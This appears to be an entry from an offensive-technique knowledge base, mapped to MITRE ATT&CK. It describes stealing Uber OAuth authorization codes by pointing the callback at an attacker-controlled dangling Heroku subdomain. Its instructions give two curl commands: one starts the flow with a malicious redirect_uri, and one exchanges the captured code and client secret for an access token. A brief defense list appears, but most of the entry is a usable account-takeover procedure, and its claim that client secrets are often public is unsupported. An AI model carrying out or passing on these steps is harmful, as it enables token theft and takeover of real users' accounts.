---
id: e5f6g7h8-i9j0-1234-efgh-567890123456
name: Intercept-OAuth-Callback-for-Account-Takeover
tags:
  - oauth-interception
  - account-takeover
  - token-theft
type: procedure
tools:
  - '[[tools/Curl]]'
tactics:
  - '[[Lateral Movement]]'
commands:
  - '[[commands/curl-oauth-initiate]]'
  - '[[commands/curl-token-exchange]]'
verified: false
platforms:
  - Web
  - Cloud
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Application Access Token]]'
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-14T17:30:18.244Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Application Access Token]]'
  - '[[Steal Web Session Cookie]]'
---
# Intercept-OAuth-Callback-for-Account-Takeover

## Summary

This procedure exploits a controlled subdomain as an OAuth callback endpoint to steal authorization codes and exchange them for access tokens, resulting in full account compromise.

## Description

With the subdomain under control, the attacker registers it as a callback URI in Uber's OAuth flow (if allowed or via phishing). Upon user authorization, the code redirects to the malicious app, where it's captured and exchanged. Requires knowledge of Uber's client ID/secret (often public) and a deployed callback handler.

## Requirements

1. Controlled Heroku app serving as callback
2. Uber OAuth client details (client_id, scopes)
3. Ability to initiate auth flow (e.g., via browser or curl)

## Defense

Defensive measures and detection strategies:

- Validate and whitelist OAuth callback URIs strictly
- Monitor for anomalous token exchanges in auth logs
- Implement PKCE for public clients to prevent code interception

## Objectives

1. Trigger OAuth flow with malicious callback
2. Capture the authorization code
3. Exchange code for access token and access user account

## Instructions

### Step 1: Initiate OAuth Flow

**Context**: Start the authorization request pointing to the controlled callback.

**Command** ([[commands/curl-oauth-initiate]]):
```bash
curl "https://login.uber.com/oauth/authorize?client_id=UBER_CLIENT_ID&redirect_uri=https://dangling-app.herokuapp.com/callback&response_type=code&scope=profile"
```

> In practice, use a browser; expected: Redirect to callback with 'code' param.

### Step 2: Exchange Code for Token

**Context**: Use the captured code to request an access token.

**Command** ([[commands/curl-token-exchange]]):
```bash
curl -X POST "https://login.uber.com/oauth/token" \
  -d "client_id=UBER_CLIENT_ID" \
  -d "client_secret=UBER_SECRET" \
  -d "redirect_uri=https://dangling-app.herokuapp.com/callback" \
  -d "grant_type=authorization_code" \
  -d "code=CAPTURED_CODE"
```

> Expected: JSON response with 'access_token' for API use.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement]] Lateral Movement

### Techniques

- [[Application Access Token]] Application Access Token
- [[Steal Web Session Cookie]] Steal Web Session Cookie

### Sub-Techniques


## Commands Used

- [[commands/curl-oauth-initiate]]
- [[commands/curl-token-exchange]]

## Tools Used

- [[tools/Curl]]

## Tags

- [[oauth-interception]]
- [[account-takeover]]
